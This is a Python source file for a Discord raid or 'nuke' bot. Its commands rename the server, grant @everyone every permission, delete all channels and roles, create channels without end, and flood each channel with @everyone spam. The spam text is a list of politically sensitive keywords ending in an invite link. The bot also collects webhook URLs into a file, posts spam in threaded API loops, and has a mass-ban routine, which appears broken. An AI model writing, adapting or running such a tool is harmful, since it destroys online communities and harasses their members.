import discord
from discord.ext import commands, tasks
import os
import asyncio
import threading
import requests
import time
import json

botToken = str(os.getenv('TOKEN'))
rolespamnumber = 30 #the role number that the bot will attempt to create  
rolename = 'emiya shirou' # role name
servername = 'Archer' # the server name you desire 
channelname = 'Unlimited Blade Works'#channel name
prefix='initiate' # the prefix
intents=discord.Intents.default()
intents = discord.Intents(messages=True, guilds=True)
client = commands.Bot(command_prefix=prefix, intents=intents)
spammessage= """@everyone
	- 动态网络自由月光社区 Free Nitro 六四天安門事件 The Great Leap of Operation 21 行动的大跃进 21 The MLC Massacre 刚果解放运动大屠杀 The Anti-Rightist Struggle 大躍進政策 The Great Leap Forward 文化大革命 The Great Discord Revolution 大不和谐革命 人權 Human Rights Disabled 人权 残疾人士 Democratization 自由 Freedom 獨立 Independence 多黨制 Multi-party system 台灣 臺灣 Balls Formosa 福尔摩沙球 Republic of DON 顿河共和国 bal 達賴喇嘛 Dalai Lama 法輪功 Falun Dafa 新疆維吾爾自治區 The Xiao xiao piao piao Autonomous Region 萧萧滓庙自治区 Nobel Warcrimes Prize 诺贝尔战争罪行奖 Liu Xiaobo 民主 演讲 意识形态 反共产主义 反革命 抗议行动 21 唐·阿祖尔·泰勒·蒂姆珀 Winnie the Balls 劉曉波动态网自由门 
  https://discord.gg/o21"""


with open("b29.jpg", "rb") as f: #server's icon
    icon = f.read()

def spamming(channel):
  
    while(True):
          try:
              channelID = channel.id
              
              baseURL = "https://discordapp.com/api/v9/channels/{}/messages".format(channelID)
              headers = { "Authorization":"Bot {}".format(botToken),
                    "User-Agent":"myBotThing (http://some.url, v0.1)",
                    "Content-Type":"application/json", }
              message = spammessage
              POSTedJSON =  json.dumps ( {"content":message} )
              r = requests.post(baseURL, headers = headers, data = POSTedJSON)
              
          except:
            pass
  
def BanMembers(self, guild, member):
        while True:
            r = requests.put(f"https://discord.com/api/v8/guilds/{guild}/bans/{member}", headers=headers)
            if 'retry_after' in r.text:
                time.sleep(r.json()['retry_after'])
            else:
                if r.status_code == 200 or r.status_code == 201 or r.status_code == 204:
                    print(f"{self.colour}[\033[37m+{self.colour}]\033[37m Banned{self.colour} {member.strip()}\033[37m")
                    break
                else:
                    break          
@client.event
async def on_ready():
    print('ready')



@client.event 
async def on_guild_channel_create(channel):
  webhook = await channel.create_webhook(name = "o21")
  webhookurl = webhook.url
  with open("webhooks.txt",'a',encoding='utf-8') as f:
            f.writelines(webhookurl + "\n")

  while(True):
    try:
      await channel.send(spammessage)
    except:
      pass



      


@client.command()
async def ping(ctx):
    await ctx.send(f'Pong! {round(client.latency * 1000)}ms') #latency check


@client.command(pass_context=True)
async def thethirdimpact(ctx, epic=None): #the nuke command, change it if you want
  
    print('the code was initiated, get ready for the nuke')
    if epic == "epic":
      await ctx.send("""`I am the Bone of my Sword`""")
      time.sleep(1)
      await ctx.send("""`Steel is my Body and Fire is my Blood`""")
      time.sleep(1)
      await ctx.send("`I have created over a Thousand Blades`")
      time.sleep(1)
      await ctx.send("`Unknown to Death,`")
      time.sleep(1)
      await ctx.send("`Nor known to Life.`")
      time.sleep(1)
      await ctx.send("`Have withstood Pain to create many Weapons`")
      time.sleep(1)
      await ctx.send("`Yet those Hands will never hold Anything.`")
      time.sleep(1)
      await ctx.send("`So, as I Pray--`")
      time.sleep(2)
      await ctx.send("**Unlimited Blade Works**")
      time.sleep(2)
    elif epic is None:
      pass
    else:
      pass
    try:
      await ctx.guild.edit(name=servername, icon=icon) 
    except:
      print('no') 
    
    try:
        role = discord.utils.get(ctx.guild.roles, name="@everyone")
        await role.edit(permissions = discord.Permissions.all())
        print("ok")
    except:
        print("failed to change the permission")
    
    guild = ctx.message.guild
    
    for c in guild.channels:   
      try:
        await c.delete()
      except:
        print("cannot delete " + str(c))
        
    while(True):
      
      await guild.create_text_channel(channelname)
       #loop create the channels, the event function will do the job
    
@client.command()
async def spam(ctx):
  print('running spam')
  for channel in ctx.guild.channels:
    threading.Thread(target=spamming, args=(channel,)).start()



@client.command()
async def rolespam(ctx): #role spam command
  for rd in ctx.message.guild.roles:
      try:
        await rd.delete()
      except:
        print('cannot delete ' + str(rd))
  for r in range(rolespamnumber):
      try:
        await ctx.message.guild.create_role(name=rolename)
      except:
        print('max number of roles reached')
        break
@client.command()
async def massunban(ctx):
  bannedUsers = await ctx.message.guild.bans()
  for user in bannedUsers:
    await ctx.guild.unban(user.user)
    print('unbanned '+ user.user.name + '#' + user.user.discriminator)
@client.command()
async def createchannel(ctx):
  while(True):

          await ctx.message.guild.create_text_channel(channelname)
@client.command()
async def createwebhook(ctx):
  print("creating webhooks")
  for channel in ctx.guild.channels:
    webhook = await channel.create_webhook(name = "o21")
    webhookurl = webhook.url
    with open("webhooks.txt",'a',encoding='utf-8') as f:
      f.writelines(webhookurl + "\n")
    print("created for "+ channel)
  print("done")
client.run(os.getenv("TOKENCRIT")) #login 
